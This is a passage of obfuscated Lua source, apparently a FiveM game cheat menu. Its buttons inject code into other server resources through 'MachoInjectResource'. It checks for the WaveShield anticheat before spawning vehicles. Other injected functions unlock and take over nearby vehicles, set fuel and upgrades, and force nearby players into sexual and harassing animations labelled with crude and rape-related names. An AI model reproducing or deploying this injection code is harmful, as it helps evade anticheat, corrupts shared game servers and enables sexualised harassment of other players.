            local YhUjIkOlPlMn = IsPedInAnyVehicle
            local VcXzQwErTyUi = GetVehiclePedIsIn
            local KpLoMkNjBhGt = DoesEntityExist
            local JkLzXcVbNmAs = SetVehicleFuelLevel

            TmPlKoMiJnBg(function()
                while BlNkJmLzXcVb and not Unloaded do
                    local ped = ZxCvBnMaSdFg()
                    if YhUjIkOlPlMn(ped, false) then
                        local veh = VcXzQwErTyUi(ped, false)
                        if KpLoMkNjBhGt(veh) then
                            JkLzXcVbNmAs(veh, 100.0)
                        end
                    end
                    Wait(100)
                end
            end)
        end

        LqWyXpR3tV()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        BlNkJmLzXcVb = false
    ]]);end);local v49=MachoMenuInputbox(v36[2],"License Plate:","...");MachoMenuButton(v36[1 + 1 ],"Set License Plate",function() local v175=0 -0 ;local v176;while true do if (v175==(0 -0)) then v176=MachoMenuGetInputbox(v49);if ((type(v176)=="string") and (v176~="")) then local v320=1227 -(322 + 905) ;local v321;while true do if (v320==(611 -(602 + 9))) then v321=string.format([[
            local function xKqLZVwPt9()
                local XcVbNmAsDfGhJkL = PlayerPedId
                local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                local pEd = XcVbNmAsDfGhJkL()
                local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                if vEh and vEh ~= 0 then
                    PoIuYtReWqAzXsDc(vEh, "%s")
                end

            end

            xKqLZVwPt9()
        ]],v176);MachoInjectResource((v41("monitor") and "monitor") or "any" ,v321);break;end end end break;end end end);local v50=MachoMenuInputbox(v36[1191 -(449 + 740) ],"Vehicle Model:","...");MachoMenuButton(v36[874 -(826 + 46) ],"Spawn Car",function() local v177=0;local v178;local v179;local v180;local v181;while true do if (v177==(949 -(245 + 702))) then if ( not v179 and v180) then local v322=0 -0 ;while true do if (v322==(0 + 0)) then v181=([[ 
            if type(CreateFrameworkVehicle) == "function" then
                local model = "%s"
                local hash = GetHashKey(model)
                local ped = PlayerPedId()
                if DoesEntityExist(ped) then
                    local coords = GetEntityCoords(ped)
                    if coords then
                        local vehicleData = {
                            vehicle = json.encode({ model = model })
                        }
                        CreateFrameworkVehicle(vehicleData, coords)
                    end
                end
            end
        ]]):format(v178);MachoInjectResource("lb-phone",v181);break;end end else local v323=0;while true do if (v323==(1898 -(260 + 1638))) then v181=([[ 
            local function XzRtVbNmQwEr()
                local tYaPlXcUvBn = PlayerPedId
                local iKoMzNbHgTr = GetEntityCoords
                local wErTyUiOpAs = GetEntityHeading
                local hGtRfEdCvBg = RequestModel
                local bNjMkLoIpUh = HasModelLoaded
                local pLkJhGfDsAq = Wait
                local sXcVbNmZlQw = GetVehiclePedIsIn
                local yUiOpAsDfGh = DeleteVehicle
                local aSxDcFgHvBn = _G.CreateVehicle
                local oLpKjHgFdSa = NetworkGetNetworkIdFromEntity
                local zMxNaLoKvRe = SetEntityAsMissionEntity
                local mVbGtRfEdCv = SetVehicleOutOfControl
                local eDsFgHjKlQw = SetVehicleHasBeenOwnedByPlayer
                local lAzSdXfCvBg = SetNetworkIdExistsOnAllMachines
                local nMqWlAzXcVb = NetworkSetEntityInvisibleToNetwork
                local vBtNrEuPwOa = SetNetworkIdCanMigrate
                local gHrTyUjLoPk = SetModelAsNoLongerNeeded
                local kLoMnBvCxZq = TaskWarpPedIntoVehicle

                local bPeDrTfGyHu = tYaPlXcUvBn()
                local cFiGuHvYbNj = iKoMzNbHgTr(bPeDrTfGyHu)
                local jKgHnJuMkLp = wErTyUiOpAs(bPeDrTfGyHu)
                local nMiLoPzXwEq = "%s"

                hGtRfEdCvBg(nMiLoPzXwEq)
                while not bNjMkLoIpUh(nMiLoPzXwEq) do
                    pLkJhGfDsAq(100)
                end

                local fVbGtFrEdSw = sXcVbNmZlQw(bPeDrTfGyHu, false)
                if fVbGtFrEdSw and fVbGtFrEdSw ~= 0 then
                    yUiOpAsDfGh(fVbGtFrEdSw)
                end

                local xFrEdCvBgTn = aSxDcFgHvBn(nMiLoPzXwEq, cFiGuHvYbNj.x + 2.5, cFiGuHvYbNj.y, cFiGuHvYbNj.z, jKgHnJuMkLp, true, false)
                local sMnLoKiJpUb = oLpKjHgFdSa(xFrEdCvBgTn)

                zMxNaLoKvRe(xFrEdCvBgTn, true, true)
                mVbGtRfEdCv(xFrEdCvBgTn, false, false)
                eDsFgHjKlQw(xFrEdCvBgTn, false)
                lAzSdXfCvBg(sMnLoKiJpUb, true)
                nMqWlAzXcVb(xFrEdCvBgTn, false)
                vBtNrEuPwOa(sMnLoKiJpUb, true)
                gHrTyUjLoPk(nMiLoPzXwEq)

                kLoMnBvCxZq(bPeDrTfGyHu, xFrEdCvBgTn, -1)
            end

            XzRtVbNmQwEr()
        ]]):format(v178);MachoInjectResource((v41("monitor") and "monitor") or "any" ,v181);break;end end end break;end if (v177==(441 -(382 + 58))) then v180=GetResourceState("lb-phone")=="started" ;v181=nil;v177=6 -4 ;end if (v177==0) then v178=MachoMenuGetInputbox(v50);v179=GetResourceState("WaveShield")=="started" ;v177=1 + 0 ;end end end);MachoMenuButton(v36[5 -2 ],"Repair Vehicle",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function FgN7LqxZyP()
            local aBcD = PlayerPedId
            local eFgH = GetVehiclePedIsIn
            local iJkL = SetVehicleFixed
            local mNoP = SetVehicleDeformationFixed

            local p = aBcD()
            local v = eFgH(p, false)
            if v and v ~= 0 then
                iJkL(v)
                mNoP(v)
            end
        end

        FgN7LqxZyP()
    ]]);end);MachoMenuButton(v36[8 -5 ],"Flip Vehicle",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function vXmYLT9pq2()
            local a = PlayerPedId
            local b = GetVehiclePedIsIn
            local c = GetEntityHeading
            local d = SetEntityRotation

            local ped = a()
            local veh = b(ped, false)
            if veh and veh ~= 0 then
                d(veh, 0.0, 0.0, c(veh))
            end
        end

        vXmYLT9pq2()
    ]]);end);MachoMenuButton(v36[1208 -(902 + 303) ],"Clean Vehicle",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function qPwRYKz7mL()
            local a = PlayerPedId
            local b = GetVehiclePedIsIn
            local c = SetVehicleDirtLevel

            local ped = a()
            local veh = b(ped, false)
            if veh and veh ~= 0 then
                c(veh, 0.0)
            end
        end

        qPwRYKz7mL()
    ]]);end);MachoMenuButton(v36[5 -2 ],"Delete Vehicle",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function LXpTqWvR80()
            local aQw = PlayerPedId
            local bEr = GetVehiclePedIsIn
            local cTy = DoesEntityExist
            local dUi = NetworkHasControlOfEntity
            local eOp = SetEntityAsMissionEntity
            local fAs = DeleteEntity
            local gDf = DeleteVehicle
            local hJk = SetVehicleHasBeenOwnedByPlayer

            local ped = aQw()
            local veh = bEr(ped, false)

            if veh and veh ~= 0 and cTy(veh) then
                hJk(veh, true)
                eOp(veh, true, true)

                if dUi(veh) then
                    fAs(veh)
                    gDf(veh)
                end
            end

        end

        LXpTqWvR80()
    ]]);end);MachoMenuButton(v36[6 -3 ],"Toggle Vehicle Engine",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function NKzqVoXYLm()
            local a = PlayerPedId
            local b = GetVehiclePedIsIn
            local c = GetIsVehicleEngineRunning
            local d = SetVehicleEngineOn

            local ped = a()
            local veh = b(ped, false)
            if veh and veh ~= 0 then
                if c(veh) then
                    d(veh, false, true, true)
                else
                    d(veh, true, true, false)
                end
            end
        end

        NKzqVoXYLm()
    ]]);end);MachoMenuButton(v36[3],"Max Vehicle Upgrades",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function XzPmLqRnWyBtVkGhQe()
            local FnUhIpOyLkTrEzSd = PlayerPedId
            local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
            local RfDsHuNjMaLpOyBt = SetVehicleModKit
            local AqWsEdRzXcVtBnMa = SetVehicleWheelType
            local TyUiOpAsDfGhJkLz = GetNumVehicleMods
            local QwErTyUiOpAsDfGh = SetVehicleMod
            local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
            local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
            local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
            local UjMiKoLpNwAzSdFg = SetVehicleExtra
            local RvTgYhNuMjIkLoPb = DoesExtraExist

            local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
            local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
            if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

            RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
            AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

            for XyZoPqRtWnEsDfGh = 0, 16 do
                local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                end
            end

            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

            local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
            if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
            end

            for QeTrBnMkOjHuYgFv = 17, 22 do
                ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
            end

            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

            for TpYuIoPlMnBvCxZq = 1, 12 do
                if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                    UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                end
            end

            MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
            LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
        end

        XzPmLqRnWyBtVkGhQe()
    ]]);end);MachoMenuButton(v36[1 + 2 ],"Teleport into Closest Vehicle",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function uPKcoBaEHmnK()
            local ziCFzHyzxaLX = SetPedIntoVehicle
            local YPPvDlOGBghA = GetClosestVehicle

            local Coords = GetEntityCoords(PlayerPedId())
            local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

            if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                if GetPedInVehicleSeat(vehicle, -1) == 0 then
                    ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                else
                    ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                end
            end
        end

        uPKcoBaEHmnK()
    ]]);end);MachoMenuButton(v36[1693 -(1121 + 569) ],"Unlock Closest Vehicle",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function TpLMqKtXwZ()
            local AsoYuTrBnMvCxZaQw = PlayerPedId
            local GhrTnLpKjUyVbMnZx = GetEntityCoords
            local UyeWsDcXzQvBnMaLp = GetClosestVehicle
            local ZmkLpQwErTyUiOpAs = DoesEntityExist
            local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
            local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
            local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
            local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
            local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

            local ped = AsoYuTrBnMvCxZaQw()
            local coords = GhrTnLpKjUyVbMnZx(ped)
            local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

            if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                VczNmLoJhBgVfCdEx(veh, true, true)
                RtYuIoPlMnBvCxZaSd(veh, true)
                EqWoXyBkVsNzQuH(veh, 1)
                YxZwQvTrBnMaSdFgHj(veh, false)
            end

        end

        TpLMqKtXwZ()
    ]]);end);MachoMenuButton(v36[217 -(22 + 192) ],"Lock Closest Vehicle",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function tRYpZvKLxQ()
            local WqEoXyBkVsNzQuH = PlayerPedId
            local LoKjBtWxFhPoZuR = GetEntityCoords
            local VbNmAsDfGhJkLzXcVb = GetClosestVehicle
            local TyUiOpAsDfGhJkLzXc = DoesEntityExist
            local PlMnBvCxZaSdFgTrEq = SetEntityAsMissionEntity
            local KjBtWxFhPoZuRZlK = SetVehicleHasBeenOwnedByPlayer
            local AsDfGhJkLzXcVbNmQwE = SetVehicleDoorsLocked
            local QwEoXyBkVsNzQuHL = SetVehicleDoorsLockedForAllPlayers
            local ZxCvBnMaSdFgTrEqWz = NetworkHasControlOfEntity

            local ped = WqEoXyBkVsNzQuH()
            local coords = LoKjBtWxFhPoZuR(ped)
            local veh = VbNmAsDfGhJkLzXcVb(coords.x, coords.y, coords.z, 10.0, 0, 70)

            if veh and TyUiOpAsDfGhJkLzXc(veh) and ZxCvBnMaSdFgTrEqWz(veh) then
                PlMnBvCxZaSdFgTrEq(veh, true, true)
                KjBtWxFhPoZuRZlK(veh, true)
                AsDfGhJkLzXcVbNmQwE(veh, 2)
                QwEoXyBkVsNzQuHL(veh, true)
            end
        end

        tRYpZvKLxQ()
    ]]);end);MachoMenuButton(v37[684 -(483 + 200) ],"Detach All Entitys",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function zXqLJWt7pN()
            local xPvA71LtqzW = ClearPedTasks
            local bXcT2mpqR9f = DetachEntity

            xPvA71LtqzW(PlayerPedId())
            bXcT2mpqR9f(PlayerPedId())
        end

        zXqLJWt7pN()
    ]]);end);MachoMenuButton(v37[1464 -(1404 + 59) ],"Twerk On Them",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function OyWTpKvmXq()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            
            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)
                    
                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if StarkDaddy then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    StarkDaddy = false
                else
                    StarkDaddy = true
                    if not HasAnimDictLoaded("switch@trevor@mocks_lapdance") then
                        RequestAnimDict("switch@trevor@mocks_lapdance")
                        while not HasAnimDictLoaded("switch@trevor@mocks_lapdance") do
                            Wait(0)
                        end        
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(playerPed, targetPed, 4103, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                    TaskPlayAnim(playerPed, "switch@trevor@mocks_lapdance", "001443_01_trvs_28_idle_stripper", 8.0, -8.0, 100000, 33, 0, false, false, false)
                end
            end
        end

        OyWTpKvmXq()
    ]]);end);MachoMenuButton(v37[2 -1 ],"Give Them Backshots",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function bXzLqPTMn9()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if StarkDaddy then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    StarkDaddy = false
                else
                    StarkDaddy = true
                    if not HasAnimDictLoaded("rcmpaparazzo_2") then
                        RequestAnimDict("rcmpaparazzo_2")
                        while not HasAnimDictLoaded("rcmpaparazzo_2") do
                            Wait(0)
                        end
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.04, -0.4, 0.1, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                    TaskPlayAnim(PlayerPedId(), "rcmpaparazzo_2", "shag_loop_a", 8.0, -8.0, 100000, 33, 0, false, false, false)
                    TaskPlayAnim(GetPlayerPed(closestPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                end
            end
        end

        bXzLqPTMn9()
    ]]);end);MachoMenuButton(v37[1 -0 ],"Wank On Them",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function qXW7YpLtKv()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if isInPiggyBack then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    wankoffperson = false
                else
                    wankoffperson = true
                    if not HasAnimDictLoaded("mp_player_int_upperwank") then
                        RequestAnimDict("mp_player_int_upperwank")
                        while not HasAnimDictLoaded("mp_player_int_upperwank") do
                            Wait(0)
                        end
                    end
                end

                TaskPlayAnim(PlayerPedId(), "mp_player_int_upperwank", "mp_player_int_wank_01", 8.0, -8.0, -1, 51, 1.0, false, false, false)
            end
        end

        qXW7YpLtKv()
    ]]);end);MachoMenuButton(v37[766 -(468 + 297) ],"Piggyback On Player",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function RtKpqLmXZV()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if isInPiggyBack then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    isInPiggyBack = false
                else
                    isInPiggyBack = true
                    if not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") then
                        RequestAnimDict("anim@arena@celeb@flat@paired@no_props@")
                        while not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") do
                            Wait(0)
                        end
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.0, -0.25, 0.45, 0.5, 0.5, 180, false, false, false, false, 2, false)
                    TaskPlayAnim(PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)
                end
            end
        end

        RtKpqLmXZV()
    ]]);end);MachoMenuButton(v37[563 -(334 + 228) ],"Blame Arrest",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function WXY7LpqKto()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if StarkCuff then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    StarkCuff = false
                else
                    StarkCuff = true
                    if not HasAnimDictLoaded("mp_arresting") then
                        RequestAnimDict("mp_arresting")
                        while not HasAnimDictLoaded("mp_arresting") do
                            Wait(0)
                        end
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.35, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                    TaskPlayAnim(PlayerPedId(), "mp_arresting", "idle", 8.0, -8, -1, 49, 0.0, false, false, false)
                end
            end
        end

        WXY7LpqKto()
    ]]);end);MachoMenuButton(v37[1],"Blame Carry",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function KmXYpTzqLW()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if StarkCarry then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    StarkCarry = false
                else
                    StarkCarry = true
                    if not HasAnimDictLoaded("nm") then
                        RequestAnimDict("nm")
                        while not HasAnimDictLoaded("nm") do
                            Wait(0)
                        end
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                    TaskPlayAnim(PlayerPedId(), "nm", "firemans_carry", 8.0, -8.0, 100000, 33, 0, false, false, false)
                end
            end
        end

        KmXYpTzqLW()
    ]]);end);MachoMenuButton(v37[3 -2 ],"Sit On Them",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function PxKvqLtNYz()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") then
                RequestAnimDict("anim@heists@prison_heistunfinished_biztarget_idle")
                while not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") do
                    Wait(0)
                end
            end

            AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 4103, 0.10, 0.28, 1.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
            TaskPlayAnim(PlayerPedId(), "anim@heists@prison_heistunfinished_biztarget_idle", "target_idle", 8.0, -8.0, 9999999, 33, 9999999, false, false, false)
            TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
        end

        PxKvqLtNYz()
    ]]);end);MachoMenuButton(v37[2 -1 ],"Ride Driver",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function vZqPWLXm97()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if RideDriver then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    RideDriver = false
                else
                    RideDriver = true
                    if not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") then
                        RequestAnimDict("mini@prostitutes@sexnorm_veh")
                        while not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") do
                            Wait(0)
                        end
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                    TaskPlayAnim(PlayerPedId(), "mini@prostitutes@sexnorm_veh", "sex_loop_prostitute", 8.0, -8.0, 100000, 33, 0, false, false, false)
                end
            end
        end

        vZqPWLXm97()
    ]]);end);MachoMenuButton(v37[1 -0 ],"Blow Driver",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function qPLWtXYzKm()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if BlowDriver then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    BlowDriver = false
                else
                    BlowDriver = true
                    if not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") then
                        RequestAnimDict("mini@prostitutes@sexnorm_veh")
                        while not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") do
                            Wait(0)
                        end
                    end

                    TaskPlayAnim(PlayerPedId(), "mini@prostitutes@sexnorm_veh", "bj_loop_prostitute", 8.0, -8.0, 100000, 33, 0, false, false, false)
                end
            end
        end

        qPLWtXYzKm()
    ]]);end);MachoMenuButton(v37[1 + 0 ],"Meditate On Them",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function XYqLvTzWKo()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if not HasAnimDictLoaded("rcmcollect_paperleadinout@") then
                RequestAnimDict("rcmcollect_paperleadinout@")
                while not HasAnimDictLoaded("rcmcollect_paperleadinout@") do
                    Wait(0)
                end
            end

            AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 57005, 0, -0.12, 1.53, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
            TaskPlayAnim(PlayerPedId(), "rcmcollect_paperleadinout", "meditiate_idle", 8.0, -8.0, 9999999, 33, 9999999, false, false, false)
            TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
        end

        XYqLvTzWKo()
    ]]);end);local v51=236 -(141 + 95) ;local v52=false;local v53=nil;local v54={[0]="slapped",[1]="punched",[2 + 0 ]="receiveblowjob",[7 -4 ]="GiveBlowjob",[9 -5 ]="headbutted",[2 + 3 ]="hug4",[16 -10 ]="streetsexfemale",[5 + 2 ]="streetsexmale",[8]="pback2",[5 + 4 ]="carry3",[14 -4 ]=".....gta298",[11]=".....gta304",[8 + 4 ]=".....gta284"};MachoMenuDropDown(v37[2],"Emote Choice",function(v182) v51=v182;end,"Slapped","Punched","Give BJ","Recieve BJ","Headbutt","Hug","StreetSexFemale","StreetSexMale","Piggyback","Carry","Butt Rape","Amazing Head","Lesbian Scissors");MachoMenuButton(v37[165 -(92 + 71) ],"Give Emote",function() local v183=0;local v184;while true do if (v183==(0 + 0)) then v184=v54[v51];if v184 then MachoInjectResource2(4 -1 ,(v41("monitor") and "monitor") or "any" ,string.format([[
            local function KmTpqXYzLv()
                local Rk3uVnTZpxf7Q = TriggerEvent
                Rk3uVnTZpxf7Q("ClientEmoteRequestReceive", "%s", true)
            end

            KmTpqXYzLv()
